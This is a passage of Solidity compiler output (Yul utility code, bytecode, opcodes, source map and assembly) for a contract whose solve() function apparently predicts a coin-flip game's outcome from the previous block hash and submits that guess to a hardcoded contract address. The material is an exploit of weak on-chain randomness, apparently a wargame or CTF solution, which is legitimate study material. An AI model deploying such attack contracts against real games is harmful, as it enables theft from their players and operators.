															"src": "4157:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4188:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4191:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "4181:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "4181:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4181:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "4022:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4314:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nodeType": "YulIdentifier",
																				"src": "4336:6:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "4344:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "4332:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4332:14:1"
																	},
																	{
																		"hexValue": "74727920616761696e",
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "4348:11:1",
																		"type": "",
																		"value": "try again"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4325:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "4325:35:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4325:35:1"
														}
													]
												},
												"name": "store_literal_in_memory_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "4306:6:1",
														"type": ""
													}
												],
												"src": "4208:159:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_bytes4_to_t_bytes4_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bytes4(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 9)\n        store_literal_in_memory_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_bytes4_t_bool__to_t_bytes4_t_bool__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_bytes4_to_t_bytes4_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_bool_to_t_bool_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function store_literal_in_memory_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4(memPtr) {\n\n        mstore(add(memPtr, 0), \"try again\")\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b6040516100459190610294565b60405180910390f35b60008060016000546001436100639190610307565b4060001c61007191906102d6565b149050801515600160149054906101000a900460ff16151514156100ca576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100c190610274565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d8260405160200161013692919061024b565b6040516020818303038152906040526040516101529190610234565b600060405180830381855af49150503d806000811461018d576040519150601f19603f3d011682016040523d82523d6000602084013e610192565b606091505b50505080600160146101000a81548160ff0219169083151502179055505090565b6101bc8161033b565b82525050565b6101cb81610347565b82525050565b60006101dc826102af565b6101e681856102ba565b93506101f681856020860161037d565b80840191505092915050565b600061020f6009836102c5565b915061021a8261040e565b602082019050919050565b61022e81610373565b82525050565b600061024082846101d1565b915081905092915050565b600060408201905061026060008301856101c2565b61026d60208301846101b3565b9392505050565b6000602082019050818103600083015261028d81610202565b9050919050565b60006020820190506102a96000830184610225565b92915050565b600081519050919050565b600081905092915050565b600082825260208201905092915050565b60006102e182610373565b91506102ec83610373565b9250826102fc576102fb6103df565b5b828204905092915050565b600061031282610373565b915061031d83610373565b9250828210156103305761032f6103b0565b5b828203905092915050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6000819050919050565b60005b8381101561039b578082015181840152602081019050610380565b838111156103aa576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f74727920616761696e000000000000000000000000000000000000000000000060008201525056fea26469706673582212209560a93a036e17dd1fd7f2f3f74feb3375ad5e8e35b1e839f3daa88f0f6946c164736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x294 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 PUSH1 0x0 SLOAD PUSH1 0x1 NUMBER PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x307 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR PUSH2 0x71 SWAP2 SWAP1 PUSH2 0x2D6 JUMP JUMPDEST EQ SWAP1 POP DUP1 ISZERO ISZERO PUSH1 0x1 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO EQ ISZERO PUSH2 0xCA JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC1 SWAP1 PUSH2 0x274 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D DUP3 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x136 SWAP3 SWAP2 SWAP1 PUSH2 0x24B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x152 SWAP2 SWAP1 PUSH2 0x234 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x18D JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x192 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP DUP1 PUSH1 0x1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP SWAP1 JUMP JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x33B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0x347 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1DC DUP3 PUSH2 0x2AF JUMP JUMPDEST PUSH2 0x1E6 DUP2 DUP6 PUSH2 0x2BA JUMP JUMPDEST SWAP4 POP PUSH2 0x1F6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x37D JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x20F PUSH1 0x9 DUP4 PUSH2 0x2C5 JUMP JUMPDEST SWAP2 POP PUSH2 0x21A DUP3 PUSH2 0x40E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22E DUP2 PUSH2 0x373 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x240 DUP3 DUP5 PUSH2 0x1D1 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x260 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x1C2 JUMP JUMPDEST PUSH2 0x26D PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1B3 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x28D DUP2 PUSH2 0x202 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2A9 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x225 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E1 DUP3 PUSH2 0x373 JUMP JUMPDEST SWAP2 POP PUSH2 0x2EC DUP4 PUSH2 0x373 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x2FC JUMPI PUSH2 0x2FB PUSH2 0x3DF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x312 DUP3 PUSH2 0x373 JUMP JUMPDEST SWAP2 POP PUSH2 0x31D DUP4 PUSH2 0x373 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x330 JUMPI PUSH2 0x32F PUSH2 0x3B0 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x39B JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x380 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x3AA JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x74727920616761696E0000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP6 PUSH1 0xA9 GASPRICE SUB PUSH15 0x17DD1FD7F2F3F74FEB3375AD5E8E35 0xB1 0xE8 CODECOPY RETURN 0xDA 0xA8 DUP16 0xF PUSH10 0x46C164736F6C63430008 SMOD STOP CALLER ",
							"sourceMap": "810:557:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1026:338;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;1059:7;1079:15;1148:1;1137:6;;1131:1;1116:12;:16;;;;:::i;:::-;1106:27;1098:36;;:45;;;;:::i;:::-;1097:52;1079:70;;1175:10;1163:22;;:8;;;;;;;;;;;:22;;;1160:73;;;1202:19;;;;;;;;;;:::i;:::-;;;;;;;;1160:73;1243:12;;;;;;;;;;;:25;;1287:23;1312:10;1269:54;;;;;;;;;:::i;:::-;;;;;;;;;;;;;1243:81;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1346:10;1335:8;;:21;;;;;;;;;;;;;;;;;;1068:296;1026:338;:::o;7:109:1:-;88:21;103:5;88:21;:::i;:::-;83:3;76:34;7:109;;:::o;122:115::-;207:23;224:5;207:23;:::i;:::-;202:3;195:36;122:115;;:::o;243:373::-;347:3;375:38;407:5;375:38;:::i;:::-;429:88;510:6;505:3;429:88;:::i;:::-;422:95;;526:52;571:6;566:3;559:4;552:5;548:16;526:52;:::i;:::-;603:6;598:3;594:16;587:23;;351:265;243:373;;;;:::o;622:365::-;764:3;785:66;849:1;844:3;785:66;:::i;:::-;778:73;;860:93;949:3;860:93;:::i;:::-;978:2;973:3;969:12;962:19;;622:365;;;:::o;993:118::-;1080:24;1098:5;1080:24;:::i;:::-;1075:3;1068:37;993:118;;:::o;1117:271::-;1247:3;1269:93;1358:3;1349:6;1269:93;:::i;:::-;1262:100;;1379:3;1372:10;;1117:271;;;;:::o;1394:316::-;1507:4;1545:2;1534:9;1530:18;1522:26;;1558:69;1624:1;1613:9;1609:17;1600:6;1558:69;:::i;:::-;1637:66;1699:2;1688:9;1684:18;1675:6;1637:66;:::i;:::-;1394:316;;;;;:::o;1716:419::-;1882:4;1920:2;1909:9;1905:18;1897:26;;1969:9;1963:4;1959:20;1955:1;1944:9;1940:17;1933:47;1997:131;2123:4;1997:131;:::i;:::-;1989:139;;1716:419;;;:::o;2141:222::-;2234:4;2272:2;2261:9;2257:18;2249:26;;2285:71;2353:1;2342:9;2338:17;2329:6;2285:71;:::i;:::-;2141:222;;;;:::o;2369:98::-;2420:6;2454:5;2448:12;2438:22;;2369:98;;;:::o;2473:147::-;2574:11;2611:3;2596:18;;2473:147;;;;:::o;2626:169::-;2710:11;2744:6;2739:3;2732:19;2784:4;2779:3;2775:14;2760:29;;2626:169;;;;:::o;2801:185::-;2841:1;2858:20;2876:1;2858:20;:::i;:::-;2853:25;;2892:20;2910:1;2892:20;:::i;:::-;2887:25;;2931:1;2921:35;;2936:18;;:::i;:::-;2921:35;2978:1;2975;2971:9;2966:14;;2801:185;;;;:::o;2992:191::-;3032:4;3052:20;3070:1;3052:20;:::i;:::-;3047:25;;3086:20;3104:1;3086:20;:::i;:::-;3081:25;;3125:1;3122;3119:8;3116:34;;;3130:18;;:::i;:::-;3116:34;3175:1;3172;3168:9;3160:17;;2992:191;;;;:::o;3189:90::-;3223:7;3266:5;3259:13;3252:21;3241:32;;3189:90;;;:::o;3285:149::-;3321:7;3361:66;3354:5;3350:78;3339:89;;3285:149;;;:::o;3440:77::-;3477:7;3506:5;3495:16;;3440:77;;;:::o;3523:307::-;3591:1;3601:113;3615:6;3612:1;3609:13;3601:113;;;3700:1;3695:3;3691:11;3685:18;3681:1;3676:3;3672:11;3665:39;3637:2;3634:1;3630:10;3625:15;;3601:113;;;3732:6;3729:1;3726:13;3723:101;;;3812:1;3803:6;3798:3;3794:16;3787:27;3723:101;3572:258;3523:307;;;:::o;3836:180::-;3884:77;3881:1;3874:88;3981:4;3978:1;3971:15;4005:4;4002:1;3995:15;4022:180;4070:77;4067:1;4060:88;4167:4;4164:1;4157:15;4191:4;4188:1;4181:15;4208:159;4348:11;4344:1;4336:6;4332:14;4325:35;4208:159;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "226600",
								"executionCost": "46642",
								"totalCost": "273242"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 850,
									"end": 927,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 833,
									"end": 927,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 833,
									"end": 927,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 957,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "1B4C3BB63058CE67B9573BEFFCBF3737E1697F4F"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 934,
									"end": 999,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 934,
									"end": 999,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 810,
									"end": 1367,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212209560a93a036e17dd1fd7f2f3f74feb3375ad5e8e35b1e839f3daa88f0f6946c164736f6c63430008070033",
									".code": [
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 810,
											"end": 1367,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1026,
											"end": 1364,
											"name": "SWAP2",
